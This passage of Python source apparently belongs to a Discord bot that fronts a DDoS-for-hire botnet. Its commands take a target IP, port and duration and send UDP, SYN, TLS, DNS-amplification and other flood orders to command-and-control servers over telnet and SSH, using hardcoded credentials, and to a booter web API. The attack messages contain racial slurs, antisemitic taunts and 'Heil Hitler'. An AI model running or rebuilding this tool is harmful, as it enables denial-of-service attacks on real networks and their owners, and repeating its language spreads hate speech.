	with telnetlib.Telnet('85.31.45.232', 421) as tn:
		tn.write(b"yuno\n")
		await asyncio.sleep(2)
		tn.write(b"yunnotop\n")
		await asyncio.sleep(2)
		tn.write(b"botcount\n")
		time.sleep(5)
		await asyncio.sleep(3)
		tn.write(b"exit\n")
		FML = tn.read_very_eager()
		file = open("bots.txt", "w")
		file.write(f"SPOOKY:\nVENOM\n:\n{FML} ")
		file.close()
		print("FML SAVED")
		await ctx.send("FML SAVED")
		string = open('bots.txt').read()
		new_str = re.sub('[^a-zA-Z0-9\n\.]', ' ', string)
		open('b.txt', 'w').write(new_str)
		time.sleep(3)
		tn.close()
		await ctx.send("filter active")
		with open("b.txt", "r") as f:
			text = f.read()
			matches = re.findall(r"\d{3} Bots  ", text)
			save = str(matches).replace("Bots  ", "")
			open('Final.txt', 'w').write(save)
			file2 = open("Final.txt", "r")
			# initializing list
			count = file2
			nigger = list(count)
			print(nigger)
			firstElement = nigger[0]
			await ctx.send("**The Bot Count Is **" + firstElement)


@Spooky.command(brief="pure raw")
async def yuriko(ctx, ip, port, time, method):
    if method == "udp":
        try:
            await ctx.message.delete()
            with telnetlib.Telnet('85.31.45.232', 420) as tn:
                tn.write(b"ctxAPI\n")
                await asyncio.sleep(2)
                tn.write(b"ctx51a!!$\n")
                await asyncio.sleep(2)
                command = (f"!pudp {ip} {port} {time} psize=1400".encode('ascii'))
                tn.write(command + b"\n")
                await asyncio.sleep(3)
                tn.write(b"exit\n")
                tn.close()
        except:
            pass
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
            channel = ssh.invoke_shell()
            channel.send(f'UDPRAW {ip} {port} {time}')
            channel.send('\u000d')
            channel.send('exit')
            channel.send('\u000d')
            ssh.close()
            imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
            raw = discord.Embed(title="Spooky | Raw", color=discord.Colour.teal())
            raw.add_field(name='Raw Go Boo!', value='', inline=False)
            raw.add_field(name='Target', value=f'{ip}', inline=False)
            raw.add_field(name='Port', value=f'{port}', inline=False)
            raw.add_field(name='Duration', value=f'{time}', inline=False)
            raw.add_field(name='Method', value=f'{method}', inline=False)
            raw.add_field(name='Kill Em All!', value=f'', inline=False)
            raw.set_footer(text="Spooky V1.8")
            raw.set_image(url=imageURL)
            raw.timestamp = datetime.datetime.utcnow()
            await ctx.send(embed=raw)
        except:
            pass
    elif method == "syn":
        try:
            await ctx.message.delete()
            with telnetlib.Telnet('85.31.45.232', 420) as tn:
                tn.write(b"ctxAPI\n")
                await asyncio.sleep(2)
                tn.write(b"ctx51a!!$\n")
                await asyncio.sleep(2)
                command = (f"!tcp {ip} {port} {time} flags=s".encode('ascii'))
                tn.write(command + b"\n")
                await asyncio.sleep(3)
                tn.write(b"exit\n")
                tn.close()
        except:
            pass
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
            channel = ssh.invoke_shell()
            channel.send(f'SYN {ip} {port} {time}')
            channel.send('\u000d')
            channel.send('exit')
            channel.send('\u000d')
            ssh.close()
            imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
            raw = discord.Embed(title="Spooky | Raw", color=discord.Colour.teal())
            raw.add_field(name='Raw Go Boo!', value='', inline=False)
            raw.add_field(name='Target', value=f'{ip}', inline=False)
            raw.add_field(name='Port', value=f'{port}', inline=False)
            raw.add_field(name='Duration', value=f'{time}', inline=False)
            raw.add_field(name='Method', value=f'{method}', inline=False)
            raw.add_field(name='Kill Em All!', value=f'', inline=False)
            raw.set_footer(text="Spooky V1.8")
            raw.set_image(url=imageURL)
            raw.timestamp = datetime.datetime.utcnow()
            await ctx.send(embed=raw)
        except:
            pass
    elif method == "ack":
        try:
            await ctx.message.delete()
            with telnetlib.Telnet('85.31.45.232', 420) as tn:
                tn.write(b"ctxAPI\n")
                await asyncio.sleep(2)
                tn.write(b"ctx51a!!$\n")
                await asyncio.sleep(2)
                command = (f"!tcp {ip} {port} {time} flags=a".encode('ascii'))
                tn.write(command + b"\n")
                await asyncio.sleep(3)
                tn.write(b"exit\n")
                tn.close()
        except:
            pass
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
            channel = ssh.invoke_shell()
            channel.send(f'ACK {ip} {port} {time}')
            channel.send('\u000d')
            channel.send('exit')
            channel.send('\u000d')
            ssh.close()
            imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
            raw = discord.Embed(title="Spooky | Raw", color=discord.Colour.teal())
            raw.add_field(name='Raw Go Boo!', value='', inline=False)
            raw.add_field(name='Target', value=f'{ip}', inline=False)
            raw.add_field(name='Port', value=f'{port}', inline=False)
            raw.add_field(name='Duration', value=f'{time}', inline=False)
            raw.add_field(name='Method', value=f'{method}', inline=False)
            raw.add_field(name='Kill Em All!', value=f'', inline=False)
            raw.set_footer(text="Spooky V1.8")
            raw.set_image(url=imageURL)
            raw.timestamp = datetime.datetime.utcnow()
            await ctx.send(embed=raw)
        except:
            pass
    elif method == "vse":
        try:
            await ctx.message.delete()
            with telnetlib.Telnet('85.31.45.232', 420) as tn:
                tn.write(b"ctxAPI\n")
                await asyncio.sleep(2)
                tn.write(b"ctx51a!!$\n")
                await asyncio.sleep(2)
                command = (f"!pudp {ip} {port} {time} psize=4200".encode('ascii'))
                tn.write(command + b"\n")
                await asyncio.sleep(3)
                tn.write(b"exit\n")
                tn.close()
        except:
            pass
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
            channel = ssh.invoke_shell()
            channel.send(f'VSE {ip} {port} {time}')
            channel.send('\u000d')
            channel.send('exit')
            channel.send('\u000d')
            ssh.close()
            imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
            raw = discord.Embed(title="Spooky | Raw", color=discord.Colour.teal())
            raw.add_field(name='Raw Go Boo!', value='', inline=False)
            raw.add_field(name='Target', value=f'{ip}', inline=False)
            raw.add_field(name='Port', value=f'{port}', inline=False)
            raw.add_field(name='Duration', value=f'{time}', inline=False)
            raw.add_field(name='Method', value=f'{method}', inline=False)
            raw.add_field(name='Kill Em All!', value=f'', inline=False)
            raw.set_footer(text="Spooky V1.8")
            raw.set_image(url=imageURL)
            raw.timestamp = datetime.datetime.utcnow()
            await ctx.send(embed=raw)
        except:
            pass
    elif method == "pps":
        try:
            await ctx.message.delete()
            with telnetlib.Telnet('85.31.45.232', 420) as tn:
                tn.write(b"ctxAPI\n")
                await asyncio.sleep(2)
                tn.write(b"ctx51a!!$\n")
                await asyncio.sleep(2)
                command = (f"!pudp {ip} {port} {time}".encode('ascii'))
                tn.write(command + b"\n")
                await asyncio.sleep(3)
                tn.write(b"exit\n")
                tn.close()
        except:
            pass
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
            channel = ssh.invoke_shell()
            channel.send(f'PPS {ip} {port} {time}')
            channel.send('\u000d')
            channel.send('exit')
            channel.send('\u000d')
            ssh.close()
            imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
            raw = discord.Embed(title="Spooky | Raw", color=discord.Colour.teal())
            raw.add_field(name='Raw Go Boo!', value='', inline=False)
            raw.add_field(name='Target', value=f'{ip}', inline=False)
            raw.add_field(name='Port', value=f'{port}', inline=False)
            raw.add_field(name='Duration', value=f'{time}', inline=False)
            raw.add_field(name='Method', value=f'{method}', inline=False)
            raw.add_field(name='Kill Em All!', value=f'', inline=False)
            raw.set_footer(text="Spooky V1.8")
            raw.set_image(url=imageURL)
            raw.timestamp = datetime.datetime.utcnow()
            await ctx.send(embed=raw)
        except:
            pass
    elif method == "killall":
        try:
            await ctx.message.delete()
            with telnetlib.Telnet('85.31.45.232', 420) as tn:
                tn.write(b"ctxAPI\n")
                await asyncio.sleep(2)
                tn.write(b"ctx51a!!$\n")
                await asyncio.sleep(2)
                command = (f"!mix {ip} {port} {time} flags=sa psize=2000".encode('ascii'))
                tn.write(command + b"\n")
                await asyncio.sleep(3)
                tn.write(b"exit\n")
                tn.close()
        except:
            pass
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
            channel = ssh.invoke_shell()
            channel.send(f'UDPRAW {ip} {port} {time}')
            channel.send('\u000d')
            channel.send('exit')
            channel.send('\u000d')
            ssh.close()
            imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
            raw = discord.Embed(title="Spooky | Raw", color=discord.Colour.teal())
            raw.add_field(name='Raw Go Boo!', value='', inline=False)
            raw.add_field(name='Target', value=f'{ip}', inline=False)
            raw.add_field(name='Port', value=f'{port}', inline=False)
            raw.add_field(name='Duration', value=f'{time}', inline=False)
            raw.add_field(name='Method', value=f'{method}', inline=False)
            raw.add_field(name='Kill Em All!', value=f'', inline=False)
            raw.set_footer(text="Spooky V1.8")
            raw.set_image(url=imageURL)
            raw.timestamp = datetime.datetime.utcnow()
            await ctx.send(embed=raw)
        except:
            pass
	
@Spooky.command(brief="killme")
async def hyuriko(ctx):
	imageURL = ("https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif")
	raw = discord.Embed(title="Spooky | Raw", color=discord.Colour.teal())
	raw.add_field(name='Method list', value='', inline=False)
	raw.add_field(name='udp', value=f'syn', inline=True)
	raw.add_field(name='ack', value=f'vse', inline=True)
	raw.add_field(name='pps', value=f'killall', inline=True)
	raw.add_field(name='Attack Args', value=f'{sprefix}yuriko ip port time method', inline=False)
	raw.add_field(name='Kill Em All!', value=f'', inline=False)
	raw.set_footer(text="Spooky V1.8")
	raw.set_image(url=imageURL)
	raw.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=raw)
	
		
			

@Spooky.command(brief="better surge")
@commands.has_role(whitelistedrole)
async def riot(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-RAW&username={apuser}')
	except:
		pass
	with telnetlib.Telnet('85.31.45.232', 420) as tn:
		tn.write(b"ctxAPI\n")
		await asyncio.sleep(2)
		tn.write(b"ctx51a!!$\n")
		await asyncio.sleep(2)
		command = (f"!udp {ip} {port} {time}".encode('ascii'))
		tn.write(command + b"\n")
		await asyncio.sleep(3)
		tn.write(b"exit\n")
		tn.close()
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'UDPRAW {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	raw = discord.Embed(title="Spooky | Riot", color=discord.Colour.teal())
	raw.add_field(name='I CANT TAKE IT ANYMORE!!!', value='', inline=False)
	raw.add_field(name='Target', value=f'{ip}', inline=False)
	raw.add_field(name='Port', value=f'{port}', inline=False)
	raw.add_field(name='Duration', value=f'{time}', inline=False)
	raw.add_field(name='LETS FUCK EM UP!!!', value=f'', inline=False)
	raw.set_footer(text="Spooky V1.8")
	raw.set_image(url=imageURL)
	raw.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=raw)

@Spooky.command(brief="alternative to tsunami")
@commands.has_role(whitelistedrole)
async def surge(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-RAW&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'UDPRAW {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Surge", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='Holy SHITTT!!!', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='The Surge Broke the Barrier!!!', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="Big tcp flood")
@commands.has_role(whitelistedrole)
async def apocalypse(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-BYPASS&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-BYPASS&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'TCP {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Apocalypse", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='The End Times Are Upon Us', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='for it is the Apocalypse', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)



@Spooky.command(brief="alternative to apocalypse")
@commands.has_role(whitelistedrole)
async def anubis(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HANDSHAKE&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-BYPASS&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'ACK {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Anubis", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='Praise the God of Death', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='And Let Anubis Lead us into the afterlife', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="alternative to blitz")
@commands.has_role(whitelistedrole)
async def auschwitz(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=PPS-FLOOD&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'VSE {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Auschwitz", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='Lets Take a Trip', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='To Auschwitz My Little Jew', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="high pps flood")
@commands.has_role(whitelistedrole)
async def blitz(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-RAW&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'PPS {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Blitz", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='Im Going To Blitz You Jew Boy', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='Heil Hitler', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="ovh killer")
@commands.has_role(whitelistedrole)
async def wildfire(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=OVH-TCP&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HANDSHAKE&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'OVHTCP {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Wildfire", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='We Cant Stop It', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='Let the Wildfire Consume You', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="big socket flood")
@commands.has_role(whitelistedrole)
async def hurricane(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-SOCKET&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-SOCKET&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'TRUCK {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Hurricane", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='What Should the Name of this Hurricane Be', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='Ah Lets go With Bell', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="tls flood")
@commands.has_role(whitelistedrole)
async def typhoon(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HTTPS-TLS&username={apuser}')
		await asyncio.sleep(2)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HTTPS-TLS&username={apuser}')
		await asyncio.sleep(2)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HTTP-RAW&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'TLS {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Typhoon", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='UwU', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='This Typhoon is making me wet', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="browser")
@commands.has_role(whitelistedrole)
async def raid(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=BROWSER&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=BROWSER&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'BROWSER {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Raid", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='Tango Down', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='Lets Get to the Extraction Point Raid Completed', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)


@Spooky.command(brief="handshake flood")
@commands.has_role(whitelistedrole)
async def friend(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HANDSHAKE&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HANDSHAKE&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'SYN {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Friend", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='Thats a Firm Handshake There', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='Friend', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="amp it up")
@commands.has_role(whitelistedrole)
async def superamp(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=DNS&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'DNS {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | SuperAmp", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='Crank Up The', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='Amps Lets Fry This Nigger', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Spooky.command(brief="homev2")
@commands.has_role(whitelistedrole)
async def home(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=DNS&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'HOMEV2 {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Home", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='I Sent A Pipebomb', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='To the Skids Home', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

try:
	loop.run_forever()
except:
	loop.stop()

#try:
	#Venom.run(token, bot=False)
#except:
	#print("failed to start bot")
	#time.sleep(5)
